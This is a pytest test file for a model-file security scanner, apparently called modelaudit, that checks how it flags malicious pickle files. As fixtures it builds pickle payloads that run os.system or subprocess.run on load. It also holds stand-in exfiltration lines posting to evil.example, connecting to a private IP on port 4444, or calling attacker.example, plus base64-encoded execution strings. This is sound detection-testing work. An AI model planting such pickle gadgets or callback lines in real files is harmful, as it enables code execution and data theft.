from __future__ import annotations

import hashlib
import io
import os
import pickle
import pickletools
from pathlib import Path
from typing import Any

import pytest

from modelaudit.cache import get_cache_manager, reset_cache_manager
from modelaudit.core import determine_exit_code, scan_model_directory_or_file
from modelaudit.core_results import merge_scan_result
from modelaudit.models import create_initial_audit_result
from modelaudit.scanners import pickle_scanner
from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, CheckStatus, IssueSeverity, ScanResult
from modelaudit.scanners.pickle_scanner import (
    _BINARY_TAIL_SCAN_BYTES,
    ALWAYS_DANGEROUS_FUNCTIONS,
    ALWAYS_DANGEROUS_MODULES,
    PickleScanner,
    _hex_token_has_execution_seed,
    _is_dangerous_module,
    _is_legitimate_serialization_file,
    _looks_like_pickle,
    _pickle_opcode_summary,
    _rebuild_tensor_indicators_are_documentation_literals,
    is_suspicious_global,
)
from tests.helpers import create_mock_pytorch_zip

EXPECTED_SYSTEM_GLOBAL = "nt.system" if os.name == "nt" else "posix.system"
BYPASS_V4_REFERENCES_TEST_CASES: tuple[tuple[str, str, IssueSeverity], ...] = (
    ("ctypes", "CDLL", IssueSeverity.CRITICAL),
    ("ctypes", "cast", IssueSeverity.CRITICAL),
    ("cProfile", "run", IssueSeverity.CRITICAL),
    ("pdb", "run", IssueSeverity.CRITICAL),
    ("timeit", "timeit", IssueSeverity.CRITICAL),
    ("profile", "run", IssueSeverity.CRITICAL),
    ("_thread", "allocate_lock", IssueSeverity.CRITICAL),
    ("linecache", "getline", IssueSeverity.WARNING),
    ("logging.config", "listen", IssueSeverity.CRITICAL),
    ("zipimport", "zipimporter", IssueSeverity.CRITICAL),
)


class MaliciousPayload:
    def __reduce__(self) -> tuple[Any, tuple[str]]:
        return (os.system, ("id",))


class NonSeekableBytesIO(io.BytesIO):
    def seekable(self) -> bool:
        return False


class CountingNonSeekableBytesIO(NonSeekableBytesIO):
    def __init__(self, initial_bytes: bytes) -> None:
        super().__init__(initial_bytes)
        self.bytes_read = 0

    def read(self, size: int | None = -1) -> bytes:
        data = super().read(size)
        self.bytes_read += len(data)
        return data


class BrokenTellStream(io.BytesIO):
    def seekable(self) -> bool:
        return True

    def tell(self) -> int:
        raise OSError("tell failed")


class BrokenRewindStream(io.BytesIO):
    def seekable(self) -> bool:
        return True

    def seek(self, *_args: object, **_kwargs: object) -> int:
        raise OSError("rewind failed")


class BrokenSupplementalReadStream(io.BytesIO):
    def __init__(self, initial_bytes: bytes) -> None:
        super().__init__(initial_bytes)
        self._native_scan_complete = False

    def seekable(self) -> bool:
        return True

    def seek(self, offset: int, whence: int = 0) -> int:
        position = super().seek(offset, whence)
        if offset == 0 and whence == 0:
            self._native_scan_complete = True
        return position

    def read(self, size: int | None = -1) -> bytes:
        if self._native_scan_complete:
            raise OSError("supplemental read failed")
        return super().read(size)


class BrokenNonSeekableReadStream(io.BytesIO):
    def seekable(self) -> bool:
        return False

    def read(self, size: int | None = -1) -> bytes:
        raise OSError("stream read failed")


class BrokenNativeReadStream(io.BytesIO):
    def seekable(self) -> bool:
        return True

    def read(self, size: int | None = -1) -> bytes:
        raise OSError("native read failed")


def _short_binunicode(data: bytes) -> bytes:
    if len(data) > 0xFF:
        raise ValueError("SHORT_BINUNICODE helper accepts at most 255 bytes")
    return b"\x8c" + bytes([len(data)]) + data


def _binunicode(data: bytes) -> bytes:
    return b"X" + len(data).to_bytes(4, "little") + data


def _binary_opcode_os_system_reduce_payload() -> bytes:
    # The command text is inert here; the scanner only needs a realistic GLOBAL/REDUCE payload shape.
    return _short_binunicode(b"os") + _short_binunicode(b"system") + b"\x93" + _short_binunicode(b"echo") + b"\x85R."


def _binary_opcode_stack_global_probe_decoy() -> bytes:
    return _short_binunicode(b"os") + _short_binunicode(b"system") + b"\x93Z"


def _global_reduce_payload(module: str, func: str) -> bytes:
    return b"\x80\x02c" + module.encode("utf-8") + b"\n" + func.encode("utf-8") + b"\n)R."


def _make_opcode_padding_stream(opcode_pairs: int) -> bytes:
    return b"\x80\x02" + (b"K\x010" * opcode_pairs) + b"."


def _make_pre_memoized_post_budget_stack_global_payload(tail: bytes) -> bytes:
    payload = bytearray(b"\x80\x04")
    payload += _short_binunicode(b"subprocess") + b"\x94"
    payload += _short_binunicode(b"run") + b"\x94"
    payload += b"\x880" * 4
    payload += tail
    return bytes(payload)


def _make_memo_expansion_pickle(iterations: int, *, inert_writes: int = 0) -> bytes:
    total_writes = iterations + inert_writes
    if not 1 <= iterations <= 255 or total_writes > 255:
        raise ValueError("iterations + inert_writes must fit in BINPUT/BINGET opcodes")

    payload = bytearray(b"\x80\x02)q\x000")
    for memo_index in range(1, iterations + 1):
        previous_index = memo_index - 1
        payload += b"h" + bytes([previous_index])
        payload += b"h" + bytes([previous_index])
        payload += b"\x86"
        payload += b"q" + bytes([memo_index])
        payload += b"0"
    for memo_index in range(iterations + 1, total_writes + 1):
        payload += b"K\x01"
        payload += b"q" + bytes([memo_index])
        payload += b"0"
    payload += b"h" + bytes([iterations]) + b"."
    return bytes(payload)


def _make_dup_heavy_pickle(iterations: int) -> bytes:
    payload = bytearray(b"\x80\x02]q\x00")
    for _ in range(iterations):
        payload += b"h\x002a0"
    payload += b"."
    return bytes(payload)


def _legacy_pytorch_object_stream(
    storage_keys: tuple[str, ...],
    storage_size: int,
    *,
    malicious_object: bool = False,
) -> bytes:
    object_stream = bytearray(b"\x80\x02]")
    for key in storage_keys:
        encoded_key = key.encode("ascii")
        object_stream += b"(" + _binunicode(b"storage")
        object_stream += b"ctorch\nByteStorage\n"
        object_stream += _binunicode(encoded_key) + _binunicode(b"cpu")
        object_stream += pickle.dumps(storage_size, protocol=2)[2:-1]
        object_stream += b"NtQa"
    if malicious_object:
        malicious_pickle = pickle.dumps(MaliciousPayload(), protocol=2)
        object_stream += malicious_pickle[2:-1] + b"a"
    object_stream += b"."
    return bytes(object_stream)


def _legacy_pytorch_storage_pid_tuple(
    key: str,
    storage_size: int,
    *,
    storage_type: bytes = b"ctorch\nByteStorage\n",
    element_count: bytes | None = None,
    extra_fields: bytes = b"",
    view_metadata: bytes = b"N",
) -> bytes:
    encoded_key = key.encode("ascii")
    encoded_count = element_count if element_count is not None else pickle.dumps(storage_size, protocol=2)[2:-1]
    return (
        b"("
        + _binunicode(b"storage")
        + storage_type
        + _binunicode(encoded_key)
        + _binunicode(b"cpu")
        + encoded_count
        + view_metadata
        + extra_fields
        + b"t"
    )


def _legacy_pytorch_object_stream_from_pid(pid_tuple: bytes) -> bytes:
    return b"\x80\x02]" + pid_tuple + b"Qa."


def _make_legacy_pytorch_container_with_object_stream(
    storage_payload: bytes,
    object_stream: bytes,
    *,
    storage_keys: tuple[str, ...] = ("0",),
    declared_storage_size: int | None = None,
) -> tuple[bytes, int]:
    storage_size = len(storage_payload) if declared_storage_size is None else declared_storage_size
    control_streams = (
        pickle.dumps(0x1950A86A20F9469CFC6C, protocol=2),
        pickle.dumps(1001, protocol=2),
        pickle.dumps(
            {
                "protocol_version": 1001,
                "little_endian": True,
                "type_sizes": {"short": 2, "int": 4, "long": 8},
            },
            protocol=2,
        ),
        object_stream,
        pickle.dumps(list(storage_keys), protocol=2),
    )
    pickle_end = sum(len(stream) for stream in control_streams)
    storage_record = b"".join(storage_size.to_bytes(8, "little") + storage_payload for _key in storage_keys)
    return b"".join(control_streams) + storage_record, pickle_end


def _memoized_legacy_pytorch_object_stream(protocol: int) -> bytes:
    payload = bytearray(b"\x80" + bytes([protocol]) + b"]\x94")
    payload += b"(" + _short_binunicode(b"storage") + b"\x94"
    payload += _short_binunicode(b"torch") + b"\x94"
    payload += _short_binunicode(b"ByteStorage") + b"\x94\x93\x94"
    payload += _short_binunicode(b"0") + b"\x94"
    payload += _short_binunicode(b"cpu") + b"\x94K\x04Nt\x94Qa"
    payload += b"(h\x01h\x04h\x05h\x06K\x04NtQa."
    return bytes(payload)


def _make_legacy_pytorch_container(
    storage_payload: bytes,
    *,
    declared_storage_size: int | None = None,
    malicious_object: bool = False,
    storage_keys: tuple[str, ...] = ("0",),
) -> tuple[bytes, int]:
    storage_size = len(storage_payload) if declared_storage_size is None else declared_storage_size
    control_streams = (
        pickle.dumps(0x1950A86A20F9469CFC6C, protocol=2),
        pickle.dumps(1001, protocol=2),
        pickle.dumps(
            {
                "protocol_version": 1001,
                "little_endian": True,
                "type_sizes": {"short": 2, "int": 4, "long": 8},
            },
            protocol=2,
        ),
        _legacy_pytorch_object_stream(storage_keys, storage_size, malicious_object=malicious_object),
        pickle.dumps(list(storage_keys), protocol=2),
    )
    pickle_end = sum(len(stream) for stream in control_streams)
    storage_record = b"".join(storage_size.to_bytes(8, "little") + storage_payload for _key in storage_keys)
    return b"".join(control_streams) + storage_record, pickle_end


def _persistent_id_checks(result: ScanResult, *, opcode: str | None = None) -> list[Any]:
    return [
        check
        for check in result.checks
        if check.details.get("pickle_rule_code") == "PERSISTENT_ID"
        and (opcode is None or check.details.get("opcode") == opcode)
    ]


def _persistent_id_issues(result: ScanResult, *, opcode: str | None = None) -> list[Any]:
    return [
        issue
        for issue in result.issues
        if issue.details.get("pickle_rule_code") == "PERSISTENT_ID"
        and (opcode is None or issue.details.get("opcode") == opcode)
    ]


def _trusted_legacy_storage_pid_checks(result: ScanResult) -> list[Any]:
    return [check for check in result.checks if check.details.get("trusted_legacy_pytorch_context") is True]


def _assert_legacy_storage_layout_incomplete(result: ScanResult) -> None:
    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "legacy_pytorch_storage_layout_incomplete" in result.metadata["scan_outcome_reasons"]
    assert not _trusted_legacy_storage_pid_checks(result)
    assert any(
        check.name == "Legacy PyTorch Storage Layout"
        and check.status == CheckStatus.FAILED
        and check.rule_code == "S902"
        for check in result.checks
    )


@pytest.mark.parametrize("protocol", [4, 5])
def test_legacy_pytorch_storage_records_accept_memoized_protocols(protocol: int) -> None:
    records = pickle_scanner._legacy_pytorch_storage_records(
        _memoized_legacy_pytorch_object_stream(protocol),
        ("0",),
    )

    assert records is not None
    assert len(records) == 1
    assert records[0].key == "0"
    assert records[0].element_count == 4
    assert records[0].element_size == 1


def test_legacy_pytorch_storage_records_reject_missing_memo_reference() -> None:
    payload = b"\x80\x02(" + _binunicode(b"storage") + b"ctorch\nByteStorage\n"
    payload += _binunicode(b"0") + _binunicode(b"cpu") + b"K\x01h\xfa" + b"tQ."

    assert pickle_scanner._legacy_pytorch_storage_records(payload, ("0",)) is None


def test_legacy_pytorch_storage_records_reject_stack_underflow() -> None:
    payload = _legacy_pytorch_object_stream(("0",), 1)
    malformed_payload = payload[:-1] + b"00."

    assert pickle_scanner._legacy_pytorch_storage_records(malformed_payload, ("0",)) is None


def test_legacy_pytorch_storage_records_reject_out_of_bounds_view() -> None:
    payload = b"\x80\x02(" + _binunicode(b"storage") + b"ctorch\nByteStorage\n"
    payload += _binunicode(b"0") + _binunicode(b"cpu") + b"K\x04"
    payload += b"(" + _binunicode(b"1") + b"K\x03K\x02t" + b"tQ."

    assert pickle_scanner._legacy_pytorch_storage_records(payload, ("0",)) is None


def test_legacy_pytorch_storage_records_reject_zip_style_five_field_id() -> None:
    payload = b"\x80\x02(" + _binunicode(b"storage") + b"ctorch\nByteStorage\n"
    payload += _binunicode(b"0") + _binunicode(b"cpu") + b"K\x04tQ."

    assert pickle_scanner._legacy_pytorch_storage_records(payload, ("0",)) is None


def test_legacy_pytorch_storage_key_parser_stops_at_opcode_budget() -> None:
    append_count = pickle_scanner._PYTORCH_LEGACY_MAX_CONTROL_OPCODES // 2
    payload = b"\x80\x02]" + ((_binunicode(b"0") + b"a") * append_count) + b"."

    assert pickle_scanner._legacy_pytorch_storage_keys(payload) is None


def test_legacy_pytorch_stream_layout_stops_at_control_opcode_budget() -> None:
    control_streams = (
        pickle.dumps(0x1950A86A20F9469CFC6C, protocol=2),
        pickle.dumps(1001, protocol=2),
        pickle.dumps(
            {
                "protocol_version": 1001,
                "little_endian": True,
                "type_sizes": {"short": 2, "int": 4, "long": 8},
            },
            protocol=2,
        ),
        _make_opcode_padding_stream((pickle_scanner._PYTORCH_LEGACY_MAX_CONTROL_OPCODES // 2) + 1),
        pickle.dumps([], protocol=2),
    )

    assert pickle_scanner._legacy_pytorch_stream_layout(b"".join(control_streams)) is None


def test_pickle_scanner_star_import_exports_scanner_class() -> None:
    namespace: dict[str, object] = {}

    exec("from modelaudit.scanners.pickle_scanner import *", namespace)

    assert namespace["PickleScanner"] is PickleScanner


def test_looks_like_pickle_sniffs_binary_and_protocol_zero_payloads() -> None:
    assert _looks_like_pickle(pickle.dumps({"safe": True}, protocol=4)) is True
    assert _looks_like_pickle(b"\x80\x01K\x01.") is True
    assert _looks_like_pickle(b"cos\nsystem\n.") is True
    assert _looks_like_pickle(b"].") is True
    assert _looks_like_pickle(b"\x88.") is True
    assert _looks_like_pickle(b"\x89.") is True
    assert _looks_like_pickle(b"not a pickle") is False


def test_can_handle_accepts_raw_pickle_and_rejects_zip_container(tmp_path: Path) -> None:
    raw_pickle = tmp_path / "model.pkl"
    raw_pickle.write_bytes(pickle.dumps({"weights": [1, 2, 3]}, protocol=4))

    zip_pickle = create_mock_pytorch_zip(tmp_path / "model.pt", malicious=False)

    assert PickleScanner.can_handle(str(raw_pickle)) is True
    assert PickleScanner.can_handle(str(zip_pickle)) is False


def test_scan_safe_pickle_uses_rust_engine_and_preserves_integrity_metadata(tmp_path: Path) -> None:
    path = tmp_path / "safe.pkl"
    path.write_bytes(pickle.dumps({"weights": [1, 2, 3]}, protocol=4))

    result = PickleScanner().scan(str(path))

    assert result.success is True
    assert result.metadata["pickle_primary_engine"] == "rust"
    assert result.metadata["file_size"] == path.stat().st_size
    assert result.metadata["file_hashes"]["sha256"]
    assert not [issue for issue in result.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}]


def test_scan_directory_reports_operational_error_without_critical_issue(tmp_path: Path) -> None:
    result = PickleScanner().scan(str(tmp_path))

    assert result.success is False
    assert result.metadata["operational_error_reason"] == "path_is_directory"
    assert not any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
    assert any(
        issue.message == "Path is a directory, not a pickle file" and issue.severity == IssueSeverity.INFO
        for issue in result.issues
    )


def test_scan_large_low_information_pickle_skips_expensive_raw_detectors(tmp_path: Path) -> None:
    path = tmp_path / "large-safe.pkl"
    path.write_bytes(pickle.dumps({"blob": "A" * (2 * 1024 * 1024)}, protocol=4))

    result = PickleScanner().scan(str(path))

    assert result.metadata["pickle_primary_engine"] == "rust"
    assert result.metadata["pickle_expensive_raw_detectors_skipped"] is True
    assert result.metadata["pickle_expensive_raw_detector_skip_reason"] == "rust_complete_clean_no_expensive_raw_seeds"


def test_expensive_raw_skip_requires_clean_complete_rust_result() -> None:
    scanner = PickleScanner()
    clean_result = ScanResult(scanner_name="pickle")
    clean_result.metadata.update({"pickle_report_status": "complete", "pickle_verdict": "clean"})
    suspicious_result = ScanResult(scanner_name="pickle")
    suspicious_result.metadata.update({"pickle_report_status": "complete", "pickle_verdict": "suspicious"})

    assert scanner._should_skip_expensive_raw_detectors(clean_result, b"A" * 128) is True
    assert scanner._should_skip_expensive_raw_detectors(suspicious_result, b"A" * 128) is False


def test_data_only_nested_pickle_notice_is_modelaudit_issue(tmp_path: Path) -> None:
    path = tmp_path / "nested-data.pkl"
    inner_payload = pickle.dumps({"tiny": "payload"}, protocol=4)
    path.write_bytes(pickle.dumps({"data": inner_payload}, protocol=4))

    result = PickleScanner().scan(str(path))

    nested_issues = [
        issue
        for issue in result.issues
        if issue.rule_code == "S213" and issue.details.get("pickle_notice_code") == "nested_payload_detected"
    ]
    assert nested_issues
    assert nested_issues[0].severity == IssueSeverity.CRITICAL


def test_expensive_raw_prefilter_emits_network_pass_for_clean_pickle(tmp_path: Path) -> None:
    path = tmp_path / "clean.pkl"
    path.write_bytes(pickle.dumps({"model_state": {"layer.weight": [1.0, 2.0, 3.0]}}, protocol=4))

    result = PickleScanner().scan(str(path))

    assert result.metadata["pickle_expensive_raw_detectors_skipped"] is True
    network_passes = [
        check
        for check in result.checks
        if check.name == "Network Communication Detection"
        and check.message == "No network communication patterns detected"
    ]
    assert len(network_passes) == 1


def test_native_findings_do_not_suppress_network_raw_detector(tmp_path: Path) -> None:
    path = tmp_path / "network-code.pkl"
    path.write_bytes(
        pickle.dumps(
            {
                "code": b"""
import socket
import requests

requests.post('http://evil.example/steal')
socket.connect(('192.168.1.100', 4444))
""",
            },
            protocol=4,
        )
    )

    result = PickleScanner().scan(str(path))

    network_issues = [
        check
        for check in result.checks
        if check.name == "Network Communication Detection" and check.status.value == "failed"
    ]
    assert network_issues
    assert not result.metadata.get("pickle_network_raw_detector_skipped")


def test_expensive_raw_prefilters_preserve_secret_and_network_findings(tmp_path: Path) -> None:
    path = tmp_path / "seeded.pkl"
    payload = {
        "token": "sk-" + ("A" * 48),
        "endpoint": "https://attacker.example/cmd",
    }
    path.write_bytes(pickle.dumps(payload, protocol=4))

    result = PickleScanner().scan(str(path))

    assert any(check.name == "Embedded Secrets Detection" for check in result.checks)
    assert any(check.name == "Network Communication Detection" for check in result.checks)
    assert not result.metadata.get("pickle_secrets_raw_detector_skipped")
    assert not result.metadata.get("pickle_network_raw_detector_skipped")


def test_expensive_raw_prefilters_preserve_bare_alpha_domain_findings(tmp_path: Path) -> None:
    path = tmp_path / "bare-domain.pkl"
    path.write_bytes(pickle.dumps({"endpoint": "attacker.example/model"}, protocol=4))

    result = PickleScanner().scan(str(path))

    assert any(check.name == "Network Communication Detection" for check in result.checks)
    assert not result.metadata.get("pickle_network_raw_detector_skipped")


def test_pickle_raw_secret_detector_exception_marks_scan_inconclusive(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    caplog: pytest.LogCaptureFixture,
) -> None:
    path = tmp_path / "secret-detector-error.pkl"
    cache_dir = tmp_path / "cache"
    path.write_bytes(pickle.dumps({"api_key": "sk-" + ("A" * 48)}, protocol=4))
    leaked_secret = "UNSTRUCTURED-PICKLE-SECRET-123456"

    def raise_detector_error(*_args: object, **_kwargs: object) -> list[dict[str, object]]:
        raise RuntimeError(f"secret detector rejected {leaked_secret}")

    monkeypatch.setattr("modelaudit.detectors.secrets.SecretsDetector.scan_model_weights", raise_detector_error)

    result = PickleScanner().scan(str(path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "raw_detector_analysis_incomplete" in result.metadata["scan_outcome_reasons"]
    coverage_checks = [
        check
        for check in result.checks
        if check.name == "Raw Detector Analysis Coverage" and check.details.get("detector") == "embedded_secrets"
    ]
    assert len(coverage_checks) == 1
    assert coverage_checks[0].severity == IssueSeverity.INFO
    assert coverage_checks[0].details["analysis_incomplete"] is True
    assert leaked_secret not in str(result.metadata)
    assert leaked_secret not in str(coverage_checks[0].details)
    assert leaked_secret not in caplog.text
    assert "<redacted>" in str(result.metadata)

    reset_cache_manager()
    try:
        aggregate = scan_model_directory_or_file(
            str(path),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        metadata = aggregate.file_metadata[str(path)]

        assert metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert "raw_detector_analysis_incomplete" in metadata["scan_outcome_reasons"]
        assert determine_exit_code(aggregate) == 2
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_pickle_raw_jit_detector_exception_marks_scan_inconclusive(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    path = tmp_path / "jit-detector-error.pkl"
    path.write_bytes(pickle.dumps({"script": "torch.jit.trace(model, inputs)"}, protocol=4))

    def raise_detector_error(*_args: object, **_kwargs: object) -> list[dict[str, object]]:
        raise RuntimeError("jit detector failed")

    monkeypatch.setattr("modelaudit.detectors.jit_script.JITScriptDetector.scan_model", raise_detector_error)

    result = PickleScanner().scan(str(path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "raw_detector_analysis_incomplete" in result.metadata["scan_outcome_reasons"]
    coverage_checks = [
        check
        for check in result.checks
        if check.name == "Raw Detector Analysis Coverage" and check.details.get("detector") == "jit_script"
    ]
    assert len(coverage_checks) == 1
    assert coverage_checks[0].details["analysis_incomplete"] is True


def test_pickle_raw_network_detector_exception_marks_scan_inconclusive(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    path = tmp_path / "network-detector-error.pkl"
    path.write_bytes(pickle.dumps({"endpoint": "https://attacker.example/model"}, protocol=4))

    def raise_detector_error(*_args: object, **_kwargs: object) -> list[dict[str, object]]:
        raise RuntimeError("network detector failed")

    monkeypatch.setattr("modelaudit.detectors.network_comm.NetworkCommDetector.scan", raise_detector_error)

    result = PickleScanner().scan(str(path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "raw_detector_analysis_incomplete" in result.metadata["scan_outcome_reasons"]
    coverage_checks = [
        check
        for check in result.checks
        if check.name == "Raw Detector Analysis Coverage" and check.details.get("detector") == "network_communication"
    ]
    assert len(coverage_checks) == 1
    assert coverage_checks[0].details["analysis_incomplete"] is True
    assert not any(
        check.name == "Network Communication Detection" and check.status == CheckStatus.PASSED
        for check in result.checks
    )


def test_expensive_raw_prefilters_skip_plain_key_substrings(tmp_path: Path) -> None:
    path = tmp_path / "plain-key.pkl"
    path.write_bytes(pickle.dumps({"key": "value"}, protocol=4))

    result = PickleScanner().scan(str(path))

    assert result.metadata["pickle_expensive_raw_detectors_skipped"] is True


def test_expensive_raw_prefilters_skip_generic_secret_words_without_values(tmp_path: Path) -> None:
    path = tmp_path / "generic-secret-words.pkl"
    path.write_bytes(
        pickle.dumps(
            {
                "apigateway": "metadata",
                "use_auth_token": False,
                "secret_key": "not a secret value",
                "password_policy": "disabled in fixture metadata",
            },
            protocol=4,
        )
    )

    result = PickleScanner().scan(str(path))

    assert result.metadata["pickle_expensive_raw_detectors_skipped"] is True


def test_expensive_raw_prefilters_skip_huggingface_style_metadata_without_values(tmp_path: Path) -> None:
    path = tmp_path / "hf-style-metadata.pkl"
    path.write_bytes(
        pickle.dumps(
            {
                "__version__": "4.37.0",
                "auto_map": {"AutoModelForCausalLM": "modeling_llama.LlamaForCausalLM"},
                "use_auth_token": None,
                "api_key": None,
                "state_dict": "A" * (2 * 1024 * 1024),
            },
            protocol=4,
        )
    )

    result = PickleScanner().scan(str(path))

    assert result.metadata["pickle_expensive_raw_detectors_skipped"] is True
    assert not result.issues


def test_expensive_raw_prefilters_skip_common_torch_metadata_without_jit_markers(tmp_path: Path) -> None:
    path = tmp_path / "torch-metadata.pkl"
    path.write_bytes(
        pickle.dumps(
            {
                "__version__": "2.3.0",
                "framework": "torch",
                "torch_dtype": "float16",
                "architectures": ["LlamaForCausalLM"],
                "state_dict": "A" * (2 * 1024 * 1024),
            },
            protocol=4,
        )
    )

    result = PickleScanner().scan(str(path))

    assert result.metadata["pickle_expensive_raw_detectors_skipped"] is True
    assert not result.issues


def test_expensive_raw_prefilters_skip_realistic_torch_state_dict_names(tmp_path: Path) -> None:
    path = tmp_path / "torch-state-dict.pkl"
    state_dict = {f"torch.layer.{index}.weight": index / 100.0 for index in range(20_000)}
    path.write_bytes(pickle.dumps(state_dict, protocol=4))

    result = PickleScanner().scan(str(path))

    assert result.metadata["pickle_expensive_raw_detectors_skipped"] is True
    assert result.metadata["pickle_expensive_raw_detector_skip_reason"] == "rust_complete_clean_no_expensive_raw_seeds"
    assert result.metadata.get("pickle_secrets_raw_detector_skipped") is None
    assert result.metadata.get("pickle_jit_raw_detector_skipped") is None
    assert result.metadata.get("pickle_network_raw_detector_skipped") is None
    assert result.metadata["pickle_raw_text_detector_skipped"] is True
    assert result.metadata["pickle_cve_raw_detector_skipped"] is True
    assert not result.issues


def test_raw_prefilters_skip_review_style_state_dict_without_detector_seeds(tmp_path: Path) -> None:
    path = tmp_path / "review-style-state-dict.pkl"
    state_dict = {f"model.layers.{index}.self_attn.q_proj.weight": index / 100.0 for index in range(50_000)}
    path.write_bytes(pickle.dumps(state_dict, protocol=4))

    result = PickleScanner().scan(str(path))

    assert result.metadata["pickle_expensive_raw_detectors_skipped"] is True
    assert result.metadata["pickle_raw_text_detector_skipped"] is True
    assert result.metadata["pickle_cve_raw_detector_skipped"] is True
    assert result.metadata.get("pickle_secrets_raw_detector_skipped") is None
    assert result.metadata.get("pickle_jit_raw_detector_skipped") is None
    assert result.metadata.get("pickle_network_raw_detector_skipped") is None
    assert not result.issues


def test_expensive_raw_prefilters_preserve_torch_jit_markers(tmp_path: Path) -> None:
    path = tmp_path / "torch-jit-metadata.pkl"
    path.write_bytes(pickle.dumps({"loader": "torch.jit.load('model.pt')"}, protocol=4))

    result = PickleScanner().scan(str(path))

    assert result.metadata.get("pickle_expensive_raw_detectors_skipped") is not True
    assert result.metadata.get("pickle_jit_raw_detector_skipped") is not True


def test_expensive_raw_prefilters_detect_embedded_python_payloads(tmp_path: Path) -> None:
    path = tmp_path / "embedded-python.pkl"
    path.write_bytes(
        pickle.dumps(
            {
                "blob": b"def payload():\n    import os\n    return os.system('id')\n",
            },
            protocol=4,
        )
    )

    result = PickleScanner().scan(str(path))

    assert result.metadata.get("pickle_expensive_raw_detectors_skipped") is not True
    assert result.metadata.get("pickle_jit_raw_detector_skipped") is not True
    assert any(
        check.name == "JIT/Script Code Execution Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_expensive_raw_prefilters_preserve_structured_secret_assignments(tmp_path: Path) -> None:
    path = tmp_path / "structured-secret.pkl"
    path.write_bytes(pickle.dumps({"env": "password=CorrectHorseBattery42"}, protocol=4))

    result = PickleScanner().scan(str(path))

    assert any(check.name == "Embedded Secrets Detection" for check in result.checks)
    assert not result.metadata.get("pickle_secrets_raw_detector_skipped")


def test_expensive_raw_prefilters_preserve_bare_ipv4_network_findings(tmp_path: Path) -> None:
    path = tmp_path / "bare-ipv4.pkl"
    path.write_bytes(pickle.dumps({"callback": "192.168.1.100"}, protocol=4))

    result = PickleScanner().scan(str(path))

    assert any(check.name == "Network Communication Detection" for check in result.checks)
    assert not result.metadata.get("pickle_network_raw_detector_skipped")


def test_scan_malicious_pickle_reports_rust_finding(tmp_path: Path) -> None:
    path = tmp_path / "evil.pkl"
    path.write_bytes(pickle.dumps(MaliciousPayload(), protocol=4))

    result = PickleScanner().scan(str(path))

    assert result.success is True
    assert result.metadata["pickle_primary_engine"] == "rust"
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
    assert any(issue.details.get("import_reference") == EXPECTED_SYSTEM_GLOBAL for issue in result.issues)


def test_nested_probe_limit_operational_semantics_and_cache_policy(tmp_path: Path) -> None:
    path = tmp_path / "probe-limit.pkl"
    cache_dir = tmp_path / "cache"
    path.write_bytes(
        pickle.dumps(
            {"blob": (_binary_opcode_stack_global_probe_decoy() * 64) + _binary_opcode_os_system_reduce_payload()},
            protocol=4,
        )
    )

    direct_result = PickleScanner().scan(str(path))

    assert direct_result.success is False
    assert direct_result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert direct_result.metadata["scan_outcome_reasons"] == ["nested_probe_limit"]
    assert direct_result.metadata["analysis_incomplete"] is True
    assert any(
        issue.message == "Nested pickle probe candidate limit exceeded"
        and issue.severity == IssueSeverity.CRITICAL
        and issue.rule_code == "S213"
        for issue in direct_result.issues
    )
    assert any(
        check.name == "Standalone Pickle Notice"
        and check.message == "Nested pickle probe candidate limit exceeded"
        and check.rule_code == "S902"
        for check in direct_result.checks
    )

    reset_cache_manager()
    try:
        aggregate_result = scan_model_directory_or_file(
            str(path),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        metadata = aggregate_result.file_metadata[str(path)]

        assert aggregate_result.success is True
        assert metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert metadata["scan_outcome_reasons"] == ["nested_probe_limit"]
        assert determine_exit_code(aggregate_result) == 1
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_scan_stream_treats_negative_size_as_unknown_size() -> None:
    payload = pickle.dumps({"safe": True}, protocol=4)

    result = PickleScanner().scan_stream(io.BytesIO(payload), -1, source="unknown-size.pkl")

    assert result.success is True
    assert result.metadata["pickle_primary_engine"] == "rust"
    assert not result.metadata.get("operational_error")


def test_scan_stream_runs_root_raw_detectors_for_seekable_stream() -> None:
    payload = pickle.dumps({"script": "os.system('id')"}, protocol=4)

    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="stream-raw.pkl")

    assert any(issue.details.get("source") == "bounded_raw_pickle_window" for issue in result.issues)


@pytest.mark.parametrize(
    ("encoded", "pattern"),
    [
        ("b3Muc3lzdGVtKCdpZCcp", "os.system"),
        ("ZXZhbCh4KQ==", "eval"),
    ],
)
def test_scan_stream_detects_base64_encoded_execution_text(encoded: str, pattern: str) -> None:
    payload = pickle.dumps({"encoded": encoded}, protocol=4)

    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="encoded-raw.pkl")

    encoded_issues = [
        issue
        for issue in result.issues
        if issue.message.startswith("Encoded pickle content decodes to dangerous code pattern")
    ]
    assert [issue.rule_code for issue in encoded_issues] == ["S604"]
    assert encoded_issues[0].details["pattern"] == pattern
    assert encoded_issues[0].details["legacy_rule_aliases"] == ["S104"]
    assert not any(issue.message.startswith("Legacy encoded dangerous pattern detected") for issue in result.issues)


def test_hex_token_seed_gate_reuses_lowered_token() -> None:
    class CountingBytes(bytes):
        lower_calls = 0

